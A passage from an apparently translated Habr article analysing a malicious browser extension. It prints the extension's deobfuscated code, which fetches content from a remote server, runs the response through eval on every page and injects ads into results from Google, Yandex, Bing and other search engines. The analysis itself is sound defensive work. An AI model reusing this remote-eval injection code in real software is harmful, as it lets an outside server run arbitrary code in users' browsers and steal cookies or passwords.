class="hljs-keyword">var</span></span> idx <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> advs) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ad = advs[idx]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ad.need_send_view) { <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> adShownAlready = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; $(ad.html) .each(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> self = $(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (self.html() .indexOf(ad.adv_id) != <span class="hljs-number"><span class="hljs-number">-1</span></span>) { adShownAlready = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span> } }); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (adShownAlready) { <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span> } $(ad.html) .each(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> self = $(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> aidElement = $(<span class="hljs-string"><span class="hljs-string">'*[aid=\''</span></span> + aid + <span class="hljs-string"><span class="hljs-string">'\']'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (self.html() .indexOf(aid) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> clickRedirectionUri = host + <span class="hljs-string"><span class="hljs-string">'get_content.php?action=click&amp;aid='</span></span> + aid + <span class="hljs-string"><span class="hljs-string">'&amp;guid='</span></span> + guid + <span class="hljs-string"><span class="hljs-string">'&amp;adv_id='</span></span> + ad.adv_id + <span class="hljs-string"><span class="hljs-string">'&amp;key='</span></span> + getKeyword(); ad.aa_text = ad.aa_text.replace(<span class="hljs-regexp"><span class="hljs-regexp">/\{AID\}/g</span></span>, <span class="hljs-string"><span class="hljs-string">"'aid'='"</span></span> + aid + <span class="hljs-string"><span class="hljs-string">"'"</span></span>); ad.aa_text = ad.aa_text.replace(<span class="hljs-regexp"><span class="hljs-regexp">/\{REDIRECT_URL\}/g</span></span>, <span class="hljs-string"><span class="hljs-string">'aid=\''</span></span> + aid + <span class="hljs-string"><span class="hljs-string">'\' onClick="self.location=\''</span></span> + clickRedirectionUri + <span class="hljs-string"><span class="hljs-string">'\'; return false;"'</span></span>); ad.host = host + <span class="hljs-string"><span class="hljs-string">'get_content.php?action=view&amp;aid='</span></span> + aid + <span class="hljs-string"><span class="hljs-string">'&amp;guid='</span></span> + guid + <span class="hljs-string"><span class="hljs-string">'&amp;adv_id='</span></span> + ad.adv_id; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ad.inject_mode == <span class="hljs-number"><span class="hljs-number">1</span></span>) { self.html(ad.aa_text); ad.need_send_view = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ad.inject_mode == <span class="hljs-number"><span class="hljs-number">2</span></span> &amp;&amp; aidElement.length == <span class="hljs-number"><span class="hljs-number">0</span></span>) { self.before(ad.aa_text); ad.need_send_view = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ad.inject_mode == <span class="hljs-number"><span class="hljs-number">3</span></span> &amp;&amp; aidElement.length == <span class="hljs-number"><span class="hljs-number">0</span></span>) { self.after(ad.aa_text); ad.need_send_view = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span> } } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {} }) } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> notify = []; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> idx <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> advs) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ad = advs[idx]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ad.need_send_view) { notify.push(ad.adv_id) } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (notify.length != <span class="hljs-number"><span class="hljs-number">0</span></span>) {} } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ucfirst</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">string</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> string.charAt(<span class="hljs-number"><span class="hljs-number">0</span></span>) .toUpperCase() + string.slice(<span class="hljs-number"><span class="hljs-number">1</span></span>) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">checkLoadedPage</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">data</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (data == <span class="hljs-literal"><span class="hljs-literal">null</span></span> || data.message != <span class="hljs-string"><span class="hljs-string">'OK'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> gKeywordFound = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> keyword = <span class="hljs-built_in"><span class="hljs-built_in">decodeURI</span></span>(getKeyword()); keyword = keyword.replace(<span class="hljs-regexp"><span class="hljs-regexp">/\+/g</span></span>, <span class="hljs-string"><span class="hljs-string">' '</span></span>); keyword = keyword.toLowerCase(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> advs = []; <span class="hljs-comment"><span class="hljs-comment">//      response,   - for (var key in data.response) { //    jquery-       - var element = data.response[key]; var foundHtml = $(element.html); if (foundHtml.length == 0) { continue } //       advs (  ) if (element.advs == undefined) { data.response[key].advs = []; //            (, ) $.ajax({ url: host + 'get_content.php', type: "GET", data: { 'action': 'get_adv_cached', 'aid': aid, 'guid': guid, 'url': url(), 'gender': '*', 'ap_id': element.ap_id, 'key': getKeyword(), 'country': data.country }, async: false, success: function (result) { try { //   eval ... var dd = eval('(' + result + ')'); //        for (var rs in dd.response) { data.response[key].advs.push(dd.response[rs]) } //   -   JSON.stringify setData(JSON.stringify(data)) } catch (e) { console.log(e) } } }) } else { //     ,   html       for (var adv in element.advs) { var ad = element.advs[adv]; if (ad.ar_text == null) { advs.push(ad); continue } var splitted = ad.ar_text.split('\r\n'); for (var idx in splitted) { if (keyword.indexOf(splitted[idx].toLowerCase()) == -1 || splitted[idx].length == 0) { continue } ad.aa_text = ad.aa_text.replace(/\{KEYWORD\}/g, keyword); ad.aa_text = ad.aa_text.replace(/\{KEYWORD_B\}/g, ucfirst(keyword)); ad.aa_text = ad.aa_text.replace(/\{KEYWORD_CONTEXT\}/g, splitted[idx]); ad.aa_text = ad.aa_text.replace(/\{KEYWORD_CONTEXT_B\}/g, ucfirst(splitted[idx])); //   injectArrayOfAds([ad]); gKeywordFound = true; break } } } } if (!gKeywordFound &amp;&amp; advs.length != 0) { injectArrayOfAds(advs) } } guid = ''; try { guid = pstfgrpnt_as_hash() } catch (e) { guid = 'chrome_u' } var isLoading = false; var main = function () { if (isUpdateTime()) { console.log("CHECKING FOR UPDATE..."); isLoading = true; $.get(host + 'get_content.php', { 'action': 'get_places_cached', 'aid': aid, 'guid': guid, 'gender': '*' }, function (result) { try { data = eval('(' + result + ')'); if (data.message != 'OK') { return } setData(JSON.stringify(data)); resetTTL(); console.log("UPD SUCCESS") } catch (e) { console.log(e); return } finally { isLoading = false } }) .error(function (jqXHR, textStatus, errorThrown) { incrementTTL(); console.log('REQUEST FAILED, NEXT CHECK IN ' + getTTL()) }); console.log("CHECKING FOR UPDATE DONE") } }; main(); var id = setInterval(function () { main() }, 100); setInterval(function () { var data = getData(); if (data == null) { return } checkLoadedPage(data) }, 100) })();</span></span></code> </pre><br></div></div><br><br>  We read the received code.  I leave only interesting points: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//     var main = function () { //    if (isUpdateTime()) { // ... //  url   http://5.61.39.110/get_content.php $.get(host + 'get_content.php', // ... function (result) { try { data = eval('(' + result + ')'); // ... } catch (e) { // ... } // ... }); // ... } }; main();</span></span></code> </pre><br><br>  This function receives data from the web server. <br><br><h3>  Note 3 </h3><br>  And what happens to the answer?  And the following happens: <br><br><pre> <code class="javascript hljs">data = <span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(<span class="hljs-string"><span class="hljs-string">'('</span></span> + result + <span class="hljs-string"><span class="hljs-string">')'</span></span>);</code> </pre><br>  Those.  Each site runs any code that the web server sent.  In other words, this code can lead away cookies, can send some information about you (passwords), can do anything on any page that you have visited. <br><br>  It seems that this is already enough to consider the extension malicious, but we will continue further.  Suddenly, someone would think that the developers are actually honest and just forgot about JSON.parse. <br><br>  We go further. <br>  Below the main () function call there is a call to the checkLoadedPage () function. <br><br><div class="spoiler">  <b class="spoiler_title">function checkLoadedPage () (+ comments)</b> <div class="spoiler_text"><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//      response,   - for (var key in data.response) { //    jquery-       - var element = data.response[key]; var foundHtml = $(element.html); if (foundHtml.length == 0) { continue } //       advs (  ) if (element.advs == undefined) { data.response[key].advs = []; //            (, ) $.ajax({ url: host + 'get_content.php', type: "GET", data: { // ... }, async: false, success: function (result) { try { //   eval ... var dd = eval('(' + result + ')'); //        for (var rs in dd.response) { data.response[key].advs.push(dd.response[rs]) } //   -   JSON.stringify setData(JSON.stringify(data)) } catch (e) { console.log(e) } } }) } else { //     ,   html       for (var adv in element.advs) { var ad = element.advs[adv]; if (ad.ar_text == null) { advs.push(ad); continue } var splitted = ad.ar_text.split('\r\n'); for (var idx in splitted) { if (keyword.indexOf(splitted[idx].toLowerCase()) == -1 || splitted[idx].length == 0) { continue } ad.aa_text = ad.aa_text.replace(/\{KEYWORD\}/g, keyword); // ... //   injectArrayOfAds([ad]); // ... break } } } } if (!gKeywordFound &amp;&amp; advs.length != 0) { injectArrayOfAds(advs) }</span></span></code> </pre><br></div></div><br><h3>  Remark 4 </h3><br>  This function changes the search results for the following search engines: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ses = [ [<span class="hljs-regexp"><span class="hljs-regexp">/google\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/search\.yahoo\./i</span></span>, /(\?|&amp;)p=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/bing\.com/i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/search\.aol\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/ask\.com/i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/altavista\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/search\.lycos\./i</span></span>, /(\?|&amp;)query=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/alltheweb\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/yandex\./i</span></span>, /(\?|&amp;)text=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/(nova\.|search\.)?rambler\./i</span></span>, /(\?|&amp;)query=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/gogo\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/go\.mail\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/nigma\./i</span></span>, /(\?|&amp;)s=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>] ];</code> </pre><br><br>  Actually, on this issue and received complaints from users. <br><br><h3>  Expansion Summary </h3><br><ul><li>  redundant code (these are resources of your computer); </li><li>  all extension code runs on every page (these are resources of your computer); </li><li>  the extension executes any code sent from the web server (I‚Äôll just give a set of phrases - online banking, passwords, messages, anonymity); </li><li>  The extension additionally inserts its search results. </li></ul><br><br>  PS If someone seems to be a strange approach to the review of the extension ‚ÄúAnd what about jquery?  And here is the bad structure of the code? ‚Äù, I immediately answer: the fact that the extension requires more rights than necessary, inserts the code on the pages more than necessary - is the first sign of a malicious extension. <br><br>  PPS Many thanks to those who send messages with errors! </div><p>Source: <a href="https://habr.com/ru/post/255801/">https://habr.com/ru/post/255801/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../255787/index.html">How to make a Laser Squad from XCOM: etude for GDB in OSX</a></li>
<li><a href="../255789/index.html">Analysis of external links in MegaIndex and updating the procurement algorithm</a></li>
<li><a href="../255791/index.html">Never Ending Story: a story in the MMORPG</a></li>
<li><a href="../255793/index.html">The results of a single rating web studios 2015</a></li>
<li><a href="../255799/index.html">RSA encryption in PHP (openssl), Android / Java, JavaScript and Go</a></li>
<li><a href="../255803/index.html">How I did an English simulator, which is used not only by my mother</a></li>
<li><a href="../255805/index.html">MS Lync: Personal Call Identification</a></li>
<li><a href="../255807/index.html">Inno Setup: creating an installer using the example of deploying a C # application</a></li>
<li><a href="../255809/index.html">Localization of WPF pages</a></li>
<li><a href="../255813/index.html">Factorial Calculation or the Power of the Stream API</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>